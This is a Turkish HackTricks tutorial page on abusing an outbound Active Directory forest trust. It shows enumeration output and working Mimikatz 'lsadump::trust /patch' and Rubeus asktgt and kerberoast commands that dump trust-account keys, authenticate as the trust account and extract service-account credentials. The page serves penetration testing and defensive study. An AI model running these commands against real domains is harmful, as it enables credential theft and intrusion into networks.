# Dış Orman Etki Alanı - Tek Yönlü (Dışa Doğru)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

Bu senaryoda **etki alanınız**, **farklı etki alanlarından** bir **ilkeye bazı ayrıcalıklar** güvenmektedir.

## Numaralandırma

### Dışa Doğru Güven
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Güvenlik Hesabı Saldırısı

Bir güvenlik açığı, iki etki alanı arasında bir güven ilişkisi kurulduğunda ortaya çıkar, burada etki alanı **A** ve etki alanı **B** olarak tanımlandı, etki alanı **B** güvenini etki alanı **A**'ya uzatır. Bu kurulumda, etki alanı **B** için etki alanı **A**'da özel bir hesap oluşturulur ve bu hesap, iki etki alanı arasındaki kimlik doğrulama sürecinde kritik bir rol oynar. Etki alanı **B** ile ilişkilendirilen bu hesap, etki alanları arasında hizmetlere erişmek için biletleri şifrelemek için kullanılır.

Burada anlaşılması gereken kritik nokta, bu özel hesabın şifresi ve karmasının bir Komut Satırı aracı kullanılarak etki alanı **A**'daki bir Etki Alanı Denetleyicisinden çıkarılabileceğidir. Bu eylemi gerçekleştirmek için kullanılan komut:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Bu çıkarma, adının sonunda **$** ile tanımlanan hesabın etkin ve **A** alanının "Domain Users" grubuna ait olması nedeniyle mümkündür, bu da bu grubun izinleriyle ilişkilendirilmiş izinlerin devralınmasını sağlar. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak **A** alanına karşı kimlik doğrulaması yapmasına olanak tanır.

**Uyarı:** Bu durumu kullanarak, sınırlı izinlerle bile olsa, bir kullanıcı olarak **A** alanında bir dayanak noktası elde etmek mümkündür. Bununla birlikte, bu erişim, **A** alanında numaralandırma yapmak için yeterlidir.

`ext.local`'in güvenen alan ve `root.local`'in güvenilen alan olduğu bir senaryoda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulacaktır. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek, `root.local` içindeki `EXT$` kimlik bilgileri ortaya çıkarılabilir. Bunu başarmak için kullanılacak komut:
```bash
lsadump::trust /patch
```
Bunu takiben, çıkarılan RC4 anahtarını kullanarak başka bir araç komutunu kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulaması yapılabilir:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Bu kimlik doğrulama adımı, `root.local` içindeki hizmetleri numaralandırma ve hatta sömürme olasılığını açar, örneğin bir Kerberoast saldırısı gerçekleştirerek hizmet hesabı kimlik bilgilerini çıkarmak için:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Açık metin güven şifresi toplama

Önceki akışta, **açık metin şifresi** yerine (ayrıca **mimikatz tarafından dökülen**) güven hash'i kullanılmıştır.

Açık metin şifresi, mimikatz'den gelen \[ CLEAR ] çıktısının onaltılıktan dönüştürülerek ve ' \x00 ' null baytları çıkarılarak elde edilebilir:

![](<../../.gitbook/assets/image (938).png>)

Bazen bir güven ilişkisi oluşturulurken, güven için bir şifre kullanıcı tarafından yazılmalıdır. Bu gösterimde, anahtar orijinal güven şifresidir ve dolayısıyla insan tarafından okunabilir. Anahtar döngüler (30 gün) olduğunda, açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir olacaktır.

Açık metin şifresi, güven hesabının Kerberos gizli anahtarını kullanarak bir TGT istemek yerine güven hesabı olarak düzenli kimlik doğrulaması yapmak için kullanılabilir. Burada, ext.local'dan root.local'a Domain Yöneticileri üyeleri için sorgulama yapılıyor:

![](<../../.gitbook/assets/image (792).png>)

## Referanslar

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.

</details>
